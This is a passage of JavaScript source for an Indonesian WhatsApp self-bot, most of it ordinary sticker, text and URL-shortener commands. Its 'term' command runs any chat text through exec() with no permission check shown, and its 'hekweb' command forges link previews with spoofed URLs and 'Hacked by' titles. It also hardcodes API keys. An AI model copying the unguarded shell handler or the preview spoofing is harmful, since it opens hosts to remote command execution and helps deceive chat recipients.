benny.sendMessage(from, {text: gas, matchedText: gas, canonicalUrl: gas, description: `Heker abiezz`, title: `Hacked by ./${pushname}`, jpegThumbnail: imgbb}, 'extendedTextMessage', {detectLinks: false})
					break
case 'hekweb':
if (!isUrl(args[0])) return reply('Link tidak valid!')
var gas = body.slice(8)
if (isQuotedImage) {
					var linknya = gas.split("|")[0];
					var titlenya = gas.split("|")[1];
					var descnya = gas.split("|")[2];
					var jadinya = gas.split("|")[3];
					var imgbb = require('imgbb-uploader')
			 		run = getRandom('.jpeg')
					encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
media = await benny.downloadAndSaveMediaMessage(encmedia)
ddatae = await imageToBase64(JSON.stringify(media).replace(/\"/gi,''))
benny.sendMessage(from, {text: `${linknya}`, matchedText: `${linknya}`, canonicalUrl: `${jadinya}`, description: `${descnya}`, title: `${titlenya}`, jpegThumbnail: ddatae}, 'extendedTextMessage', {detectLinks: false})
} else if (isQuotedSticker) {
	var linknya = body.slice(8)
	encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await benny.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
				benny.sendMessage(from, {text: `${linknya}`, matchedText: `${linknya}`, canonicalUrl: `https://youtube.com/c/bennyhidayat`, description: `Hacked by ${pushname}`, title: `Terhemked :v`, jpegThumbnail: anu}, 'extendedTextMessage', {detectLinks: false})
			} else if (!isQuotedImage) {
				try {
					ppimg = await benny.getProfilePicture(sender)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ddatae = await imageToBase64(JSON.stringify(ppimg).replace(/\"/gi,''))
				benny.sendMessage(from, {text: `${gas}`, matchedText: `${gas}`, canonicalUrl: `${gas}`, description: `Hacked by ${pushname}`, title: `Terhemked :v`, jpegThumbnail: ddatae}, 'extendedTextMessage', {detectLinks: false})
			}
break
case 'imagetobase64':
case 'imgtobase64':

if (!isQuotedImage) return reply('Tag gambar nya!')
if ((isMedia || isQuotedImage) && args.length == 0) 
ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
const ehgmedia = await benny.downloadAndSaveMediaMessage(ger)
const nihiya = await imageToBase64(ehgmedia)
	benny.sendMessage(from, nihiya, text, {quoted: adadeh})
	break
	case 'sticktobase64':
case 'stickertobase64':

if ((isMedia || isQuotedSticker) && args.length == 0) 
ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const ehgmed = await benny.downloadAndSaveMediaMessage(ger)
plerlah = fs.readFileSync(ehgmed)
const niya = await plerlah.toString('base64')
	benny.sendMessage(from, niya, text, {quoted: adadeh})
	break
	case 'base64tostick':
case 'base64tosticker':

tekss = `args[0]`
anu = await Buffer.from(tekss, 'base64')
	benny.sendMessage(from, anu, sticker, {quoted: adadeh})
	break
	case 'base64toimage':
	case 'base64toimg':
	
	if (args.length < 1) {
const base64nih = args[0]
const nihiyak = await Buffer.from(base64nih, 'base64')
reply(mess.wait)
	benny.sendMessage(from, nihiyak, image, {quoted: adadeh, caption: 'Neh..'})
	} else if (args.length > 1) {
const base64nih = args[0]
const nihiyak = await Buffer.from(base64nih, 'base64')
reply(mess.wait)
	benny.sendMessage(from, nihiyak, image, {quoted: adadeh, caption: 'Neh..'})
	}
	break
case 'leave':

if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					setTimeout( () => {
				    benny.groupLeave(from)
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					reply(`*Bye Group ${groupName}*`)
					}, 1000) // 1000 = 1s, 2500) // 1000 = 1s,
					setTimeout( () => {
					}, 0) // 1000 = 1s,
					reply('*Bot Akan keluar dalam hitungan 10 detik*')
	break
case 'ssweb':

	if (args.length < 1) return reply('Urlnya mana om')
	teks = body.slice(7)
	reply(mess.wait)
						buffer = await getBaper(`https://hujanapi.herokuapp.com/api/ssweb?url=${teks}&apikey=${hujankey}`)
	benny.sendMessage(from, buffer, image, { quoted: adadeh, caption: 'Neh..'})
	break
case 'chatlist':
case 'cekchat':

	benny.updatePresence(from, Presence.composing)
	teks = `Total : ${totalchat.length}`
	reply(teks)
	break
case 'speed':
case 'ping':

	const timestamp = speed();
	const latensi = speed() - timestamp
	exec(`neofetch --stdout`, (error, stdout, stderr) => {
	const child = stdout.toString('utf-8')
	const teks = child.replace(/Memory:/, "Ram:")
	reply(`*${teks}Speed: ${latensi.toFixed(4)} _Detik_*`)
	})
	break
	case 'stickquote':
	
    if (args.length < 1) return reply('Teks nya mana??')
	teks = body.slice(12)
			teks1 = teks.split('|')[0]
			teks2 = teks.split('|')[1]
	reply(mess.wait)
	buffer = `https://terhambar.com/aw/qts/proses.php?kata=${teks1}&author=${teks2}&tipe=random&font=./font/font3.otf&size=90`
	sendStickerUrl(from, buffer)
	break
	case 'stickquote2':
	
    if (args.length < 1) return reply('Teks nya mana??')
	teks = body.slice(13)
			teks1 = teks.split('|')[0]
			teks2 = teks.split('|')[1]
	reply(mess.wait)
	buffer = `https://terhambar.com/aw/qts/proses.php?kata=${teks1}&author=${teks2}&tipe=random&font=./font/font2.ttf&size=90`
	sendStickerUrl(from, buffer)
	break
	case 'stickquote3':
	
    if (args.length < 1) return reply('Teks nya mana??')
	teks = body.slice(13)
			teks1 = teks.split('|')[0]
			teks2 = teks.split('|')[1]
	reply(mess.wait)
	buffer = `https://terhambar.com/aw/qts/proses.php?kata=${teks1}&author=${teks2}&tipe=random&font=./font/font1.otf&size=90`
	sendStickerUrl(from, buffer)
	break
	case 'stickquote4':
	
    if (args.length < 1) return reply('Teks nya mana??')
	teks = body.slice(13)
			teks1 = teks.split('|')[0]
			teks2 = teks.split('|')[1]
	reply(mess.wait)
	buffer = `https://terhambar.com/aw/qts/proses.php?kata=${teks1}&author=${teks2}&tipe=random&font=./font/font4.otf&size=90`
	sendStickerUrl(from, buffer)
	break
	case 'quoteit':
	case 'qouteit':
	
    if (args.length < 1) return reply('Teks nya mana??')
	const tqt = body.slice(9)
	reply(mess.wait)
					anu = await fetchJson(`https://terhambar.com/aw/qts/?kata=${tqt}&author=Benny%20Hidayat&tipe=random&font=./font/font4.otf&size=55`)
	buffer = await getBaper(anu.result)
	benny.sendMessage(from, buffer, image, {quoted: adadeh})
	break
case 'term':

	const cmd = body.slice(6)
	exec(cmd, (err, stdout) => {
	if(err) return reply(`root@Self:~ ${err}`)
	if (stdout) {
	reply(stdout)
		}
	})
	break
case 'sulap':

				          var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
                                        ranpll = getRandom('.gif')
                                        ranoll = getRandom('.webp')
                                        anu1ll = await fetchJson(`https://naufalhoster.xyz/textmaker/ryu_fighter?apikey=${naufalkey}&url=${teks}`)
										bofor = anu1ll.result.GIF
                                       sendStickerUrl(from, bofor)
                                             } else {
                                                 reply('Gunakan foto!')
                                          }           
                                          break
										  case 'pptrigger':

mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
				 try {
					anu = await benny.getProfilePicture(mentioned)
				} catch {
					anu = await getBaper('https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg')
				}
				media = await getBaper(anu)
					datae = await imageToBase64(JSON.stringify(anu).replace(/\"/gi, ''))
					fs.writeFileSync('janckuk.jpeg', datae, 'base64')
					var imgbb = require('imgbb-uploader')
					data = await imgbb("cedeb44b8d204947a6833ca1412ca77d", 'janckuk.jpeg')
					 reply(mess.wait)
						console.log(data)
                                        sendStickerUrl(from, `https://pecundang.herokuapp.com/api/triggered?url=${data.display_url}`)
                                          break
case 'triggered':
				          var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					owgi = await benny.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                      sendStickerUrl(from, `https://pecundang.herokuapp.com/api/triggered?url=${anu.display_url}`)
                                             } else if (isQuotedSticker) {
												 if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated) return reply('Reply sticker gambar!')
ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ran = getRandom('.png')
ehgmediabi = await benny.downloadAndSaveMediaMessage(ger)
exec(`ffmpeg -i ${ehgmediabi} ${ran}`, async (err) => {
	reply(mess.wait)
	fs.writeFileSync('triger.png', fs.readFileSync(ran))
				anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", 'triger.png')
					console.log(anu)
                                        sendStickerUrl(from, `https://pecundang.herokuapp.com/api/triggered?url=${anu.display_url}`)
				})
			} else {
                                                 reply('Gunakan foto!')
                                          }           
                                          break
									case 'sfire':
									
									if (!isOwner && !ben.key.fromMe && !isPremium) return reply(mess.only.premium)
									if (isQuotedImage) {
                                     var imgbb = require('imgbb-uploader')
                                        ger = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
                                        reply(mess.wait)
					                    owgi = await benny.downloadAndSaveMediaMessage(ger)
					                    anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
										console.log(teks)
										sendStickerUrl(from, `https://api.zeks.xyz/api/burning-image?apikey=YunitaGanteng&image=${teks}`)
									} else if (isQuotedSticker) {
										var imgbb = require('imgbb-uploader')
												 if (ben.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated) return reply('Reply sticker gambar!')
ger = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ran = getRandom('.png')
ehgmediabi = await benny.downloadAndSaveMediaMessage(ger)
exec(`ffmpeg -i ${ehgmediabi} ${ran}`, async (err) => {
	reply(mess.wait)
	fs.writeFileSync('sfire.png', fs.readFileSync(ran))
				anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", 'sfire.png')
					console.log(anu)
                                        sendStickerUrl(from, `https://api.zeks.xyz/api/burning-image?apikey=YunitaGanteng&image=${anu.display_url}`)
				})
									} else {
										reply('Reply media!')
									}
                                          break
									case 'bapakfont':
									
									tekss = body.slice(11)
									anu = await fetchJson(`https://api.terhambar.com/bpk?kata=${tekss}`)
									reply(`*${anu.text}*`)
									break
									case 'halah':
									
									if (args.length > 1) {
                    entah = body.slice(7)
                    imni = halah(entah)
                    reply(imni)
									} else if (args.length < 1) {
					entah = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                    imni = halah(entah)
                    reply(imni)
									}
                    break
					case 'alay': 			
					teks = body.slice(6)
					reply(teks.replace('A', '4').replace('I', '1').replace('i', '1').replace('E', '3').replace('e', '3').replace('o', '0').replace('O', '0').replace('S', '5').replace('s', '5').replace('G', '6').replace('B', '8'))
					break
									case 'hilih':
									
									if (args.length > 1) {
                    entah = body.slice(7)
                    imni = hilih(entah)
                    reply(imni)
									} else if (args.length < 1) {
					entah = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                    imni = hilih(entah)
                    reply(imni)
									}
                    break
					case 'kapital':
									
									if (args.length > 1) {
                    entah = body.slice(9)
                    imni = entah.toUpperCase()
                    reply(imni)
									} else if (args.length < 1) {
					entah = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                    imni = entah.toUpperCase()
                    reply(imni)
									}
                    break
					case 'rumus':
									
									if (!Number(args[1])) return reply('Nomor harus berupa angka!')
									if (args[0] == 'persegi') {
									     entah = args[1]
                    imni = await rumus.datar.keliling.persegi(entah, true)
					console.log(imni)
                    reply(imni) 
									} else if (args[0] == 'segitiga') {
										entah = body.slice
                    imni = await rumus.datar.keliling.segitiga(entah, true)
					console.log(imni)
                    reply(imni) 
									}
                    break
					
					case 'infonomor':
									
									if (!Number(args[0])) return reply('Nomor harus berupa angka!')
									if (args[0].includes('-')) return reply(`Block nih contoh: ${prefix}infonomor 6289636006352`)
                    entah = body.slice(11)
                    imni = await infotlp.getOperator(entah)
					teks = `*Operator:* ${imni.operator}\n*Kartu:* ${imni.card}`
                    reply(teks)
                    break
					case 'bilangangka':
                  case 'angkabilang':
					
					if (!Number(args[0])) return reply('Angkanya mana?')
                    entah = body.slice(13)
                    imni = await angkab(entah)
                    reply(`*${imni}*`)
                    break
					case 'besarkecil':
teks = body.slice(12)
anu = teks.split("").map((chara, index) => index % 2 == 0 ? chara.toLowerCase() : chara.toUpperCase()).join("")
reply(anu) 
break
					case 'pastegg':
					
					reply(mess.wait)
					paste = body.slice(9)
					anu = await pasteGG.post({
  name: namabot, // Optional
  description: `PasteGG by ${namabot}`, // Optional
  expires: "2025-12-30T02:25:56.428Z", // Optional
  files: [{
    name: `${namabot}.txt`, // Optional
    content: {
      format: "text",
      value: paste
    }
  }]
})
console.log(anu)
benny.sendMessage(from, {text: anu.result.url, matchedText: anu.result.url, canonicalUrl: `paste.gg`, description: `PasteGG by ${namabot}`, title: `PasteGG`, jpegThumbnail: setthumb}, 'extendedTextMessage', { quoted: adadeh})
     break
					case 'pastebin':
					
					reply(mess.wait)
					paste = body.slice(10)
					opas1 = paste.split('|')[0]
					opas2 = paste.split('|')[1]
                   anu = await fetchJson(`https://pecundang.herokuapp.com/api/pastebin?q=${opas1}&code=${opas2}`)
                   reply(anu.result)		
                   break 
					case 'huluh':
									
									if (args.length > 1) {
                    entah = body.slice(7)
                    imni = huluh(entah)
                    reply(imni)
									} else if (args.length < 1) {
					entah = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                    imni = huluh(entah)
                    reply(imni)
									}
                    break
					case 'download':
					if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		                if (isQuotedAudio) {
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	                    const media = await benny.downloadAndSaveMediaMessage(encmedia, './src/download/lagu')
					} else if (isQuotedImage) {
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	                    const media = await benny.downloadAndSaveMediaMessage(encmedia, './src/download/gambar')
					} else if (isQuotedSticker) {
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	                    const media = await benny.downloadAndSaveMediaMessage(encmedia, './src/download/sticker')
					} else if (isQuotedVideo) {
						encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	                    const media = await benny.downloadAndSaveMediaMessage(encmedia, './src/download/video')
					} else {
						reply('Reply media!')
					}
					break
					case 'heleh':
									
									if (args.length > 1) {
                    entah = body.slice(7)
                    imni = heleh(entah)
                    reply(imni)
									} else if (args.length < 1) {
					entah = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                    imni = heleh(entah)
                    reply(imni)
									}
                    break
					case 'holoh':
									
									if (args.length > 1) {
                    entah = body.slice(7)
                    imni = holoh(entah)
                    reply(imni)
									} else if (args.length < 1) {
					entah = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                    imni = holoh(entah)
                    reply(imni)
									}
                    break
									case 'bitly':
									
									teks = body.slice(7)
									anu = await bitly.shorten(teks)
									reply(anu.link)
									break
									case 'sid':
									
									teks = body.slice(5)
									anu = await fetchJson(`https://api.zeks.xyz/api/sid-shortener?apikey=YunitaGanteng&url=https://api.zeks.xyz`)
									shorti = `*Url Pendek dari* : ${teks}\n*Result* : ${anu.short}`
									reply(shorti)
									break
									case 'readall':
						if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		                anu = await benny.chats.all()
						for (let o of anu) {
							benny.chatRead(o.jid)
						}
						break
						case 'setstatus':
						if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		                setgrup = `status@broadcast`
						reply(`*Sukses set fake reply menjadi status*`)
						break
case 'cuttly':
									
									anu = await fetchJson(`https://cutt.ly/api/api.php?key=341578d2de946244680120edd9d03f068dd38&short=${args[0]}`)
									reply(anu.url.shortLink)
									break
								case 'tinyurl':
									
									/**
									
									* @param {String} url
 * @param {Object} options
 */
const fetchText = (url, optiono) => {
    return new Promise((resolve, reject) => {
        return fetch(url, optiono)
            .then(response => response.text())
            .then(text => resolve(text))
            .catch(err => {
                console.error(err)
                reject(err)
            })
    })
}
									teks = body.slice(9)
									anu = await fetchText(`https://tinyurl.com/api-create.php?url=${args[0]}`)
									shorti = `*Url Pendek dari* : \n${teks}\n*Result* : ${anu}`
									reply(shorti)
									break
case 'payment':
case 'payments':
	reply(`──「 *PAYMENT* 」──\n\n- Gopay : 0896-3600-6352\n- Pulsa : 0813-8728-9617 (+5K)\n\n──「 *SELF-BOT* 」──`)
	break
case 'syirilah':

shol = fs.readFileSync('./src/audio/sholawat/sirilah.mp3')
benny.sendMessage(from, shol, audio, {mimetype: 'audio/mp4', quoted: adadeh, ptt: true})
break
case 'yarasulallah':

shol = fs.readFileSync('./src/audio/sholawat/yarasulallah.mp3')
benny.sendMessage(from, shol, audio, {mimetype: 'audio/mp4', quoted: adadeh, ptt: true})
break
case 'neko':

	{
	var items = ["anime neko"];
	var nime = items[Math.floor(Math.random() * items.length)];
	var url = "https://api.fdci.se/rep.php?gambar=" + nime;
		
	axios.get(url)
	.then((result) => {
	var n = JSON.parse(JSON.stringify(result.data));
	var nimek =  n[Math.floor(Math.random() * n.length)];
	imageToBase64(nimek) 
	.then(
	(response) => {
	reply(mess.wait)
	var buf = Buffer.from(response, 'base64'); 
	benny.sendMessage(from, buf ,MessageType.image, { caption: `_Neko!_`, quoted: adadeh } )
		}
	)
	.catch(
	(error) => {
	console.log(error);
				}
			)
		});
	}
	break
case 'blocklist': 

	teks = '𝗕𝗟𝗢𝗖𝗞 𝗟𝗜𝗦𝗧 :\n'
	for (let block of blocked) {
	teks += `┣➢ @${block.split('@')[0]}\n`
	}
	teks += `𝗧𝗼𝘁𝗮𝗹 : ${blocked.length}`
	benny.sendMessage(from, teks.trim(), extendedText, {quoted: adadeh, contextInfo: {"mentionedJid": blocked}})
	break
case 'ban':

                if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			const arx = body.split(' ')
                if (arx[1] == 'add') {
					   _ban.push(arx[2] + '@s.whatsapp.net')
                        fs.writeFileSync('./src/banned.json', JSON.stringify(_ban))
                        reply(`Sukses ban ${arx[2]}`)
                } else if (arx[1] == 'del') {
                        _ban.splice(arx[2] + '@s.whatsapp.net', 1)
                        fs.writeFileSync('./src/banned.json', JSON.stringify(_ban))
                        reply('Selesai~')
                } else {
                   reply('Format salah!')
                }
            break
	case 'afk': // by Slavyan
                
				if (isAfk) return reply(`*Kamu sudah afk!*\n\n*Sejak:* ${waktuafk}\n*Alasan:* ${reason}`)
                reason = q ? q : 'Nothing.'
                afk.addAfkUser(sender, time, reason, _afk)
				if (pushname === undefined) return reply(`Fitur AFK berhasil *diaktifkan*!\n\n➸ *Username*: BOT\n➸ *Alasan*: ${reason}`)
                reply(`*Fitur AFK berhasil diaktifkan!*\n\n*╔❏* *AFK*\n*╠❏*\n*╠❏* *Nama:* ${pushname}\n*╠❏* *Alasan*: ${reason}`)
            break
	case 'premiumlist': 
     pml = []
	teks = '_*PREMIUM LIST*_ :\n'
	o = 1
	for (let tod of _premium) {
		pml.push(tod.id)
	teks += `*${o++}.* @${tod.id.split('@')[0]}\n*Nomor:* ${tod.id.replace('@s.whatsapp.net', '')}\n*API:* wa.me/${tod.id.replace('@s.whatsapp.net', '')}\n=========================\n`
	}
	teks += `*Total: ${_premium.length}*`
	benny.sendMessage(from, teks, text, {quoted: adadeh, contextInfo: {"mentionedJid": pml}})
	break
case 'ocr': 

	if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
	const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
	const media = await benny.downloadAndSaveMediaMessage(encmedia)
	reply(mess.wait)
	await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
	.then(teks => {
	reply(teks.trim())
	fs.unlinkSync(media)
	})
	.catch(err => {
	reply(err.message)
	fs.unlinkSync(media)
	})
	} else {
	reply('𝗸𝗶𝗿𝗶𝗺 𝗳𝗼𝘁𝗼 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗲𝗽𝘁𝗶𝗼𝗻 ${prefix}𝗼𝗰𝗿')
	}
	break
				case 'identitaspalsu':
				case 'fake':
				
				anu = await fetchJson(`https://pencarikode.xyz/api/faker?country=id_ID&apikey=pais`)
         		teks = `*╔❏* *IDENTITAS PALSU*\n  *╠❏* *Name* : ${anu.data.name.fullName}\n  *╠❏* *Birthday* : ${anu.data.date.birthday}\n  *╚❏* *Phone Number* : ${anu.data.phone.phone_number}`
				reply(teks)
				break
				case 'creategc':
				const namagc = body.slice(10)
				todcul = []
				for (let o of ben)
		benny.groupCreate(namagc, ben.participant)
break
				 case 'dogestick':
				 anu = JSON.parse(fs.readFileSync('./src/dogestick.json'))
					randIndex = anu[Math.floor(Math.random() * anu.length)]
                        sendStickerUrl(from, randIndex)
                    break
					  case 'telestick':
                    telestick(from, args[0])
                     break
					 case 'searchstick':
					 teks = body.slice(13)
					anu = await fetchJson(`https://api.vhtear.com/wasticker?query=${teks}&apikey=YunitaGanteng`)
					buffer = anu.result.data
					for (sticker_ in buffer) {
                        sendStickerUrl(from, buffer[sticker_])
                    }
					break
					case 'sticker2':
						if (isMedia && !ben.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia, `./src/sticker/${sender}`)
							ran = getRandom('.webp')
							require('./lib/exif.js').createExif(namabot, '')
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./src/sticker/data.exif ./src/sticker/${sender}.webp -o ./src/sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											benny.sendMessage(from, fs.readFileSync(`./src/sticker/${sender}.webp`), sticker, {quoted: adadeh})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./src/sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./src/sticker/${sender}.webp`)
						} else if ((isMedia && ben.message.videoMessage.fileLength < 10000000 || isQuotedVideo && ben.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							if (!arg.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia, `./src/sticker/${sender}`)
							ran = getRandom('.webp')
							require('./lib/exif.js').createExif(namabot, '')
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./src/sticker/data.exif ./src/sticker/${sender}.webp -o ./src/sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											benny.sendMessage(from, fs.readFileSync(`./src/sticker/${sender}.webp`), sticker, {quoted: adadeh})
											fs.unlinkSync(media)
											fs.unlinkSync(`./src/sticker/${sender}.webp`)
											fs.unlinkSync(`./src/sticker/data.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./src/sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'searchstick2':
					 teks = body.slice(14)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${teks}`)
					jsonData = anu.result
					randIndex = Math.floor(Math.random() * jsonData.length)
  randKey = jsonData[randIndex]
  ono = randKey.stickers
				anu = ono[Math.floor(Math.random() * ono.length)]
				sendStickerUrl(from, anu)
					break
					case 'wpmuslim':
                    ono = JSON.parse(fs.readFileSync('./src/wallmuslim.json'))
	anu = ono[Math.floor(Math.random() * ono.length)]
										buffer = await getBaper(anu)
										benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Neh..'})
										break
						case 'antibokep':
            if (!isGroup) return reply(`Hanya Bisa digunakan di dalam grup!`)
            if (!isGroupAdmins && !ben.key.fromMe) return reply(`Perintah ini hanya bisa di gunakan oleh Admin group!`)
            if (!isBotGroupAdmins) return reply(`Perintah ini hanya bisa di gunakan jika Bot menjadi Admin!`)
                if (args.length < 1) return reply('Pilih on atau off!')
                if (args[0] === 'on') {
                    var cek = _porn.includes(from);
                    if(cek){
                        reply(`antiporno Sudah diaktifkan di grup ini`)
                    } else {
                        _porn.push(from)
                    fs.writeFileSync('./src/aporn.json', JSON.stringify(_porn))
                    reply('antiporno berhasil di aktifkan di group ini!')
                    }
                } else if (args[0] === 'off') {
                    
                        _porn.splice(from, 1)
                    fs.writeFileSync('./src/aporn.json', JSON.stringify(_porn))
                    reply('antiporno berhasil di nonaktifkan di group ini!')
                   } else {
                    reply('Pilih on atau off!')
                }
              break 
				case 'swm':
					case 'stickerwm':
						if (isMedia && !ben.message.videoMessage || isQuotedImage) {
							if (!arg.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia, `./src/sticker/${sender}`)
							packname1 = arg.split('|')[0]
							const author1 = arg.split('|')[1]
							require('./lib/exif.js').createExif(packname1, author1)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./src/sticker/data.exif ./src/sticker/${sender}.webp -o ./src/sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											benny.sendMessage(from, fs.readFileSync(`./src/sticker/${sender}.webp`), sticker, {quoted: adadeh})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./src/sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./src/sticker/${sender}.webp`)
						} else if ((isMedia && ben.message.videoMessage.fileLength < 10000000 || isQuotedVideo && ben.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							if (!arg.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ben
